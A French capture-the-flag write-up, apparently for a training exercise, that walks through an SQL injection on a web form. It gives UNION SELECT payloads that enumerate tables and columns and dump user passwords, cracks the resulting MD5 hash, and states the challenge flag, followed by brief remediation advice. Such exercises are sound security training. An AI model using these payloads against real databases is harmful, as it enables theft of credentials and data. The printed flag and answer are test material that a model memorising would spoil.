# Recherches

1. Envoi du formulaire vide retourne une erreur MySQL
2. Ecrire un exploit afin de lister toutes les tables présentes
   ```
   1 UNION SELECT table_schema, table_name FROM information_schema.tables
   ```
3. Lister les colonnes
   ```
   1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
   ```
4. Afficher le mot de passe des utilisateurs
   ```
   1 UNION SELECT countersign, Commentaire FROM users
   ```
5. Le commentaire indique quel utilisateur correspond au flag
6. `md5(5ff9d0165b4f92b14994e5c685cdce28) == "FortyTwo"`
7. `FortyTwo` => `fortytwo`
8. `sha256(fortytwo) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

> FLAG: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

# Explications

Les failles sql sont courantes dans les applications qui ne sécurisent pas leurs entrées.

# Corrections

Pour eviter les failles sql plusieurs choses sont necessaires:
     - mises a jours frequentes de la db SQL
     - sanitize les entrees utilisateurs

